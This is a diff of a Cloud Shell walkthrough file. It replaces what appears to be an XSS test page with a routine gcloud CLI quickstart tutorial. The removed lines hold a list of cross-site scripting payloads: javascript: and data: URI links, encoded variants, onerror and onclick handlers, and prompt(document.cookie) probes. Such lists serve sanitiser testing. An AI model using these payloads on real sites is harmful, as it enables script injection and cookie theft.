-<walkthrough-editor-spotlight spotlightid="menu-terminal-new-terminal" ng-version="0.0.0-PLACEHOLDER"><spotlight-base _nghost-bkf-c63=""><a _ngcontent-bkf-c63="" dismissbanners="" role="button" aria-label="open spotlight" class="spotlight-link">New Terminal 2</a></spotlight-base></walkthrough-editor-spotlight>
-g
-&lt;walkthrough-ICON_NAME data-xss&gt;&lt;/walkthrough-ICON_NAME&gt;
-<walkthrough-cloud-shell-icon _nghost-bkf-c92="" ng-version="0.0.0-PLACEHOLDER"><button _ngcontent-bkf-c92="" type="button" mat-icon-button="" class="mat-focus-indicator mat-icon-button-inline mat-icon-button mat-button-base ng-star-inserted" aria-label="Spotlight Activate Cloud Shell"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c92="" role="img" inline="" class="mat-icon notranslate mat-icon-inline mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="cloud-shell-icon"><svg width="100%" height="100%" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fit="" preserveAspectRatio="xMidYMid meet" focusable="false"><path d="M12 12.996L8.5 8.99H5l3.5 4.006L5 17h3.5l3.5-4.004zm-9-8C3 3.892 3.893 3 4.995 3h14.01C20.107 3 21 3.893 21 4.995v14.01A1.995 1.995 0 0 1 19.005 21H4.995A1.995 1.995 0 0 1 3 19.005V4.995zm10.01 9.983h5.044L18 17l-4.99-.037V14.98z" fill-rule="evenodd"></path></svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----><!----></walkthrough-cloud-shell-icon>
-<walkthrough-web-preview-icon _nghost-bkf-c92="" ng-version="0.0.0-PLACEHOLDER"><button _ngcontent-bkf-c92="" type="button" mat-icon-button="" class="mat-focus-indicator mat-icon-button-inline mat-icon-button mat-button-base ng-star-inserted" aria-label="Spotlight Web Preview"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c92="" role="img" inline="" class="mat-icon notranslate mat-icon-inline mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="web-preview-icon"><svg width="100%" height="100%" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fit="" preserveAspectRatio="xMidYMid meet" focusable="false"> <path d="M20 4c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2 V6c0-1.1.9-2 2-2h16zm0 14V8H4v10h16zm-8-9l7 4-7 4-7-4 7-4zm0 5.9c1 0 1.9-.8 1.9-1.9 0-1.1-.8-1.9-1.9-1.9-1.1 0-1.9.8-1.9 1.9 0 1.1.9 1.9 1.9 1.9z"></path></svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----><!----></walkthrough-web-preview-icon>
-<walkthrough-cloud-shell-editor-icon _nghost-bkf-c92="" ng-version="0.0.0-PLACEHOLDER"><button _ngcontent-bkf-c92="" type="button" mat-icon-button="" class="mat-focus-indicator mat-icon-button-inline mat-icon-button mat-button-base ng-star-inserted" aria-label="Spotlight Launch Editor"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c92="" role="img" inline="" class="mat-icon notranslate mat-icon-inline mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="cloud-shell-editor-icon"><svg xmlns="http://www.w3.org/2000/svg" id="p6n-devshell-icon-editor" width="100%" height="100%" viewBox="0 0 24 24" fit="" preserveAspectRatio="xMidYMid meet" focusable="false">
-      <path d="M11 19h10v2H11v-2zm-8-1.8l11.1-11 3.8 3.7L6.8 21H3v-3.8z
-               M20.7 7S18.9 8.9 19 8.9l-3.8-3.8L17 3.3c.4-.4 1-.4 1.4 0l2.3 2.3c.4.4.4 1 0
-               1.4z"></path></svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----><!----></walkthrough-cloud-shell-editor-icon>
-<walkthrough-nav-menu-icon _nghost-bkf-c92="" ng-version="0.0.0-PLACEHOLDER"><button _ngcontent-bkf-c92="" type="button" mat-icon-button="" class="mat-focus-indicator mat-icon-button-inline mat-icon-button mat-button-base ng-star-inserted" aria-label="Spotlight Navigation Menu"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c92="" role="img" inline="" class="mat-icon notranslate mat-icon-inline mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="console-nav-menu"><svg id="menu" width="100%" height="100%" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fit="" preserveAspectRatio="xMidYMid meet" focusable="false"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" fill-rule="evenodd"></path></svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----><!----></walkthrough-nav-menu-icon>
-<walkthrough-notification-menu-icon _nghost-bkf-c92="" ng-version="0.0.0-PLACEHOLDER"><button _ngcontent-bkf-c92="" type="button" mat-icon-button="" class="mat-focus-indicator mat-icon-button-inline mat-icon-button mat-button-base ng-star-inserted" aria-label="Spotlight Notifications"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c92="" role="img" inline="" class="mat-icon notranslate mat-icon-inline mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="notification-menu"><svg id="notifications" width="100%" height="100%" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg" fit="" preserveAspectRatio="xMidYMid meet" focusable="false"><path d="M10.5,15 L7.5,15 C7.5,16.1 8.175,17 9,17 C9.825,17 10.5,16.1 10.5,15 Z M9.99515756,3.09903766 C12.2798101,3.56043498 14,5.57933155 14,8 L14,11.9957886 L15,12.9957886 L15,14 L3,14 L3,12.9957886 L4,11.9957886 L4,8.00000001 L4,8 C4,5.57933155 5.72018994,3.56043498 8.00484244,3.09903766 C8.00163949,3.06645872 8,3.03342082 8,3 C8,2.44771525 8.44771525,2 9,2 C9.55228475,2 10,2.44771525 10,3 C10,3.03342082 9.99836051,3.06645872 9.99515756,3.09903766 Z" fill-rule="evenodd"></path></svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----><!----></walkthrough-notification-menu-icon>
-<walkthrough-pin-section-icon _nghost-bkf-c92="" ng-version="0.0.0-PLACEHOLDER"><button _ngcontent-bkf-c92="" type="button" mat-icon-button="" class="mat-focus-indicator mat-icon-button-inline mat-icon-button mat-button-base mat-button-disabled ng-star-inserted" disabled="true"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c92="" role="img" inline="" class="mat-icon notranslate mat-icon-inline mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="pin-section"><svg xmlns="http://www.w3.org/2000/svg" id="pin" width="100%" height="100%" viewBox="0 0 24 24" fit="" preserveAspectRatio="xMidYMid meet" focusable="false"><path d="M16 5h.99L17 3H7v2h1v7l-2 2v2h5v6l1 1 1-1v-6h5v-2l-2-2z" fill-rule="evenodd"></path></svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----><!----></walkthrough-pin-section-icon>
-h
-<walkthrough-tutorial-duration duration="DURATION" _nghost-bkf-c115="" ng-version="0.0.0-PLACEHOLDER"><div _ngcontent-bkf-c115="" class="walkthrough-duration"><img _ngcontent-bkf-c115="" role="presentation" class="walkthrough-duration-icon" src="https://walkthroughs.googleusercontent.com/tutorial/resources/duration-clock-icon-v1.svg"><div _ngcontent-bkf-c115="" class="walkthrough-duration-label">DURATION minutes</div></div></walkthrough-tutorial-duration>
-h1
-<walkthrough-tutorial-duration duration="XSSDURATION" _nghost-bkf-c115="" ng-version="0.0.0-PLACEHOLDER"><div _ngcontent-bkf-c115="" class="walkthrough-duration"><img _ngcontent-bkf-c115="" role="presentation" class="walkthrough-duration-icon" src="https://walkthroughs.googleusercontent.com/tutorial/resources/duration-clock-icon-v1.svg"><div _ngcontent-bkf-c115="" class="walkthrough-duration-label">XSSDURATION minutes</div></div></walkthrough-tutorial-duration>
-h2
-<walkthrough-tutorial-duration duration="XSSDURATION<xss>" _nghost-bkf-c115="" ng-version="0.0.0-PLACEHOLDER"><div _ngcontent-bkf-c115="" class="walkthrough-duration"><img _ngcontent-bkf-c115="" role="presentation" class="walkthrough-duration-icon" src="https://walkthroughs.googleusercontent.com/tutorial/resources/duration-clock-icon-v1.svg"><div _ngcontent-bkf-c115="" class="walkthrough-duration-label">XSSDURATION&lt;xss&gt; minutes</div></div></walkthrough-tutorial-duration>
-h3</p>
-<walkthrough-code-block language="" _nghost-bkf-c91="" ng-version="0.0.0-PLACEHOLDER"><div _ngcontent-bkf-c91="" class="code-block-button-container ng-star-inserted"><!----><div _ngcontent-bkf-c91="" class="code-block-copy ng-star-inserted"><button _ngcontent-bkf-c91="" type="button" mat-icon-button="" aria-label="Copy to clipboard" mattooltip="Copy to clipboard" mattooltipclass="code-block-tooltip" dismissbanners="" class="mat-focus-indicator mat-tooltip-trigger code-block-copy-button cfc-button-small mat-icon-button mat-button-base"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c91="" role="img" svgicon="copy" class="mat-icon notranslate mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="copy"><svg width="100%" height="100%" viewBox="0 0 24 24" fit="" preserveAspectRatio="xMidYMid meet" focusable="false">
-      <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zM8 5c-1.1 0-2 .9-2 2v14c0
-               1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2H8zm11
-               16H8V7h11v14z" fill-rule="evenodd"></path>
-    </svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----></div><!----></div><!----><!----><div _ngcontent-bkf-c91="" class="code-block"><div _ngcontent-bkf-c91="" class="code-block-transcluded-content" hidden="">\x3cimg src=x2 onerror=alert(2)\x3e
-\u003cimg src=x3 onerror=alert(3)\u003e
-&amp;lt;img src=x3 onerror=alert(3)&amp;gt;
-&lt;walkthrough-editor-spotlight spotlightId="menu-terminal-new-terminal"&gt;New Terminal&lt;/walkthrough-editor-spotlight&gt;
-&lt;walkthrough-editor-spotlight xss=123 onclick=alert() spotlightId="menu-terminal-new-terminal"&gt;New Terminal 2&lt;/walkthrough-editor-spotlight&gt;
-</div><div _ngcontent-bkf-c91="" class="code-block-content-container"><span _ngcontent-bkf-c91="" class="code-block-content"><span _ngcontent-bkf-c91="" class="ng-star-inserted"><span class="pun">\</span><span class="pln">x3cimg src</span><span class="pun">=</span><span class="pln">x2 onerror</span><span class="pun">=</span><span class="pln">alert</span><span class="pun">(</span><span class="lit">2</span><span class="pun">)\</span><span class="pln">x3e<br></span><span class="pun">\</span><span class="pln">u003cimg src</span><span class="pun">=</span><span class="pln">x3 onerror</span><span class="pun">=</span><span class="pln">alert</span><span class="pun">(</span><span class="lit">3</span><span class="pun">)\</span><span class="pln">u003e<br></span><span class="pun">&amp;</span><span class="pln">lt</span><span class="pun">;</span><span class="pln">img src</span><span class="pun">=</span><span class="pln">x3 onerror</span><span class="pun">=</span><span class="pln">alert</span><span class="pun">(</span><span class="lit">3</span><span class="pun">)&amp;</span><span class="pln">gt</span><span class="pun">;</span><span class="pln"><br></span><span class="pun">&lt;</span><span class="pln">walkthrough</span><span class="pun">-</span><span class="pln">editor</span><span class="pun">-</span><span class="pln">spotlight spotlightId</span><span class="pun">=</span><span class="str">"menu-terminal-new-terminal"</span><span class="pun">&gt;</span><span class="typ">New</span><span class="pln"> </span><span class="typ">Terminal</span><span class="pun">&lt;</span><span class="str">/walkthrough-editor-spotlight&gt;<br>&lt;walkthrough-editor-spotlight xss=123 onclick=alert() spotlightId="menu-terminal-new-terminal"&gt;New Terminal 2&lt;/</span><span class="pln">walkthrough</span><span class="pun">-</span><span class="pln">editor</span><span class="pun">-</span><span class="pln">spotlight</span><span class="pun">&gt;</span><span class="pln"><br></span></span><!----><!----><!----></span></div></div><!----></walkthrough-code-block>
-</walkthrough-html-step><!----><!----><!----><!----><!--xssed--></div></div></shadow-boxer><!----><!----><!----></content-renderer><!----></div></div></app-root>
-    <script src="https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.ru.fvCSXqWR094.O/m=gapi_iframes/exm=client/rt=j/sv=1/d=1/ed=1/rs=AHpOoo88emHWCICPfjRpd9SuPuSKoIuM4Q/cb=gapi.loaded_1?le=scs" nonce="" async=""></script><script src="https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.ru.fvCSXqWR094.O/m=client/rt=j/sv=1/d=1/ed=1/rs=AHpOoo88emHWCICPfjRpd9SuPuSKoIuM4Q/cb=gapi.loaded_0?le=scs" nonce="" async=""></script><script src="https://walkthroughs.googleusercontent.com/javascript/4jcv2xv5-t6uw-rled-5jfa-foy54z4zj2p3/en/runtime-angular.js" nonce=""></script><script src="https://apis.google.com/js/client.js" nonce="" type="text/javascript" async="" gapi_processed="true"></script>
+  
+<p><walkthrough-metadata>
+  <meta name="title" content="Quickstart: Introduction to using the gcloud CLI in Cloud Shell." />
+  <meta name="description" content="Run a few core commands in Cloud Shell to get started with using gcloud CLI." />
+  <meta name="keywords" content="gcloud, CLI, Cloud Shell, Google Cloud CLI"/>
+  <meta name="component_id" content="163415" />
+</walkthrough-metadata></p>
+
+<html devsite>
+  <head>
+    
+
+    
+
+    
+    
+    
+    
+
+    
+    
+  
   
 
-<div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="polite" id="cdk-live-announcer-0"></div></body></html>
-[a](javascript:prompt(document.cookie))
-[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-![a](javascript:prompt(document.cookie))\
-<javascript:prompt(document.cookie)>
-<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
-![a'"`onerror=prompt(document.cookie)](x)\
-[citelol]: (javascript:prompt(document.cookie))
-[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
-[test](javascript://%0d%0aprompt(1))
-[test](javascript://%0d%0aprompt(1);com)
-[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
-[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[clickme](vbscript:alert(document.domain))
-_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
-<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
-[text](http://danlec.com " [@danlec](/danlec) ")
-[a](javascript:this;alert(1))
-[a](javascript:this;alert(1&#41;)
-[a](javascript&#58this;alert(1&#41;)
-[a](Javas&#99;ript:alert(1&#41;)
-[a](Javas%26%2399;ript:alert(1&#41;)
-[a](javascript:alert&#65534;(1&#41;)
-[a](javascript:confirm(1)
-[a](javascript://www.google.com%0Aprompt(1))
-[a](javascript://%0d%0aconfirm(1);com)
-[a](javascript:window.onerror=confirm;throw%201)
-[a](javascript:alert(document.domain&#41;)
-[a](javascript://www.google.com%0Aalert(1))
-[a]('javascript:alert("1")')
-[a](JaVaScRiPt:alert(1))
-![a](https://www.google.com/image.png"onload="alert(1))
-![a]("onerror="alert(1))
-</http://<?php\><\h1\><script:script>confirm(2)
-[XSS](.alert(1);)
-[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
-[ ](http://a?p=[[/onclick=alert(0) .]])
-[a](javascript:new%20Function`al\ert\`1\``;)
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+
+    <title>
+  Get started with using Google Cloud CLI in Cloud Shell.
+</title>
+    <meta name='robots' content='noindex' />
+    <meta name="no_page_title" value="true" />
+  </head>
+  <body>
+
+  
+
+   <h1 id="get-started-with-using-google-cloud-cli-in-cloud-shell." data-text="   Get started with using Google Cloud CLI in Cloud Shell. ">
+  Get started with using Google Cloud CLI in Cloud Shell.
+</h1>
+
+    <section>
+      <h2 id="heading" data-text=" "> </h2>
+      <img src="https://cloud-dot-devsite-v2-prod.appspot.com/walkthroughs/images/intro-page.png" alt>
+    </section>
+
+    <section class="intro">
+      
+
+<p>Learn how to:</p>
+
+<ol>
+<li><p>Enable billing in a Google Cloud project.</p></li>
+<li><p>Set some Google Cloud CLI default properties in Cloud Shell.</p></li>
+<li><p>Run gcloud CLI core commands in Cloud Shell.</p></li>
+<li><p>View information about gcloud CLI concepts.</p></li>
+<li><p>Do more with gcloud CLI.</p></li>
+</ol>
+
+<p>Estimated time to complete:
+<walkthrough-tutorial-duration duration="5"></walkthrough-tutorial-duration></p>
+
+<p>To begin, click <strong>Start</strong>.</p>
+
+
+    </section>
+
+    <section class="prereqs">
+      
+      
+    </section>
+
+    <section class="steps">
+      
+
+<h2 id="enable_billing_and_apis" data-text="Enable billing and APIs">Enable billing and APIs</h2>
+
+<ol>
+<li><walkthrough-project-setup billing="true"></walkthrough-project-setup></li>
+</ol>
+
+<p>To set <code translate="no" dir="ltr">gcloud</code> default properties in Cloud Shell, click <strong>Next</strong>.</p>
+
+<h2 id="set_gcloud_default_properties" data-text="Set gcloud default properties">Set <code translate="no" dir="ltr">gcloud</code> default properties</h2>
+
+<ol>
+<li><p>To open Cloud Shell, click <walkthrough-cloud-shell-icon>
+</walkthrough-cloud-shell-icon>. <walkthrough-spotlight-pointer spotlightId="cloud-shell-activate-button">
+Show me</walkthrough-spotlight-pointer>.</p>
+
+<p>This operation might take some time to complete.</p></li>
+<li><p>Disable color in the messages printed to the terminal:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud config set disable_color true
+</code></pre></li>
+<li><p>Unset this property:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud config unset disable_color
+</code></pre></li>
+<li><p>Read about <code translate="no" dir="ltr">gcloud</code> configurations:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud topic configurations
+</code></pre>
+<p>To exit, enter <code translate="no" dir="ltr">q</code>.</p></li>
+</ol>
+
+<p>To run gcloud CLI core commands <code translate="no" dir="ltr">list</code>, <code translate="no" dir="ltr">info</code>, and <code translate="no" dir="ltr">help</code>, click
+<strong>Next</strong>.</p>
+
+<h2 id="run_gcloud_core_commands" data-text="Run gcloud core commands">Run <code translate="no" dir="ltr">gcloud</code> core commands</h2>
+
+<ol>
+<li><p>List the accounts that have credentials stored on the local system:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud auth list
+</code></pre>
+<p>If the <strong>Authorize Cloud Shell</strong> dialog appears and you agree to the terms,
+click <strong>Authorize</strong>.</p>
+
+<p>The output is similar to the following:</p>
+<pre class="prettyprint lang-terminal" translate="no" dir="ltr"><code translate="no" dir="ltr">Credentialed Accounts
+
+ACTIVE: *
+ACCOUNT: izumi@example.com
+</code></pre></li>
+<li><p>List the properties in your active gcloud CLI configuration:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud config list
+</code></pre></li>
+<li><p>View information about your gcloud CLI installation and the
+active configuration:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud info
+</code></pre></li>
+<li><p>View information about gcloud CLI:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud help
+</code></pre>
+<p>To exit, enter <code translate="no" dir="ltr">q</code>.</p></li>
+<li><p>View the help documentation for <code translate="no" dir="ltr">gcloud compute instances create</code>:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud help compute instances create
+</code></pre>
+<p>To exit, enter <code translate="no" dir="ltr">q</code>.</p></li>
+</ol>
+
+<p>To view information about gcloud CLI concepts, click <strong>Next</strong>.</p>
+
+<h2 id="view_information_about_gcloud_concepts" data-text="View information about gcloud concepts">View information about <code translate="no" dir="ltr">gcloud</code> concepts</h2>
+
+<ol>
+<li><p>See all available commands under <code translate="no" dir="ltr">gcloud topic</code>:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud help topic
+</code></pre>
+<p>To exit, enter <code translate="no" dir="ltr">q</code>.</p></li>
+<li><p>See information on filtering:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud topic filters
+</code></pre>
+<p>To exit, enter <code translate="no" dir="ltr">q</code>.</p></li>
+<li><p>Learn more about <code translate="no" dir="ltr">gcloud</code> command structure:</p>
+<pre class="prettyprint lang-sh" translate="no" dir="ltr"><code translate="no" dir="ltr">gcloud topic command-conventions
+</code></pre>
+<p>To exit, enter <code translate="no" dir="ltr">q</code>.</p></li>
+</ol>
+
+<p>You have successfully run some of the key gcloud CLI commands by
+using the Cloud Shell.</p>
+
+<p>To learn about the next steps, click <strong>Next</strong>.</p>
+
+
+    </section>
+
+    <h2 id="next-steps" data-text="Next steps">Next steps</h2>
+
+    
+    <p>
+      Keep the resources that you created and do more with gcloud CLI, or clean up to avoid
+      billing charges.
+    </p>
+    
+
+    <section class="whatsnext">
+      
+      <h3 id="whats-next" data-text="Do more with gcloud CLI">Do more with gcloud CLI</h3>
+      
+      
+
+<p><walkthrough-tutorial-card icon="CLOUD_SHELL_SECTION"
+                           title="Overview of gcloud CLI"
+                           url="sdk/gcloud">
+  Learn more about gcloud CLI.
+</walkthrough-tutorial-card></p>
+
+<p><walkthrough-tutorial-card icon="CLOUD_SHELL_SECTION"
+                           title="gcloud CLI common commands"
+                           url="sdk/docs/cheatsheet">
+  Refer to the gcloud CLI cheat sheet for a list of commonly used
+  commands.
+</walkthrough-tutorial-card></p>
+
+<p><walkthrough-tutorial-card icon="CLOUD_SHELL_SECTION"
+                           title="Install the gcloud CLI locally"
+                           url="sdk/docs/install">
+  Install the gcloud CLI on your local machine.
+</walkthrough-tutorial-card></p>
+
+<p><walkthrough-tutorial-card icon="CLOUD_SHELL_SECTION"
+                           title="Install additional components"
+                           url="sdk/docs/components">
+  Install additional components such as <code translate="no" dir="ltr">kubectl</code> using the
+  gcloud CLI component manager.
+</walkthrough-tutorial-card></p>
+
+
+    </section>
+
+    
+
+<walkthrough-inline-feedback></walkthrough-inline-feedback>
+
+
+
+  
